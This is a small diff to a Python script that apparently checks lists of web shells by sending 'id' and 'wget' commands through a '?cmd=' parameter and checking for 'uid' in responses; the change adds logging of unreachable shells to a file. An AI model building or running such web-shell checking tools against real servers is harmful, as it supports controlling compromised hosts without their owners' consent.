@@ -68,6 +68,7 @@ def send_requests_and_check_responses(shell_url):
                 response_text_wget = requests.get(shell_url + f"?cmd={cmd_wget}", timeout=7000, verify=False).text
             except requests.exceptions.ConnectionError as exception:
                 print(exception)
+                not_working_shells_file.write(shell_url + "\n")
                 pass
 
             contains_uid = response_text_id.find("uid")
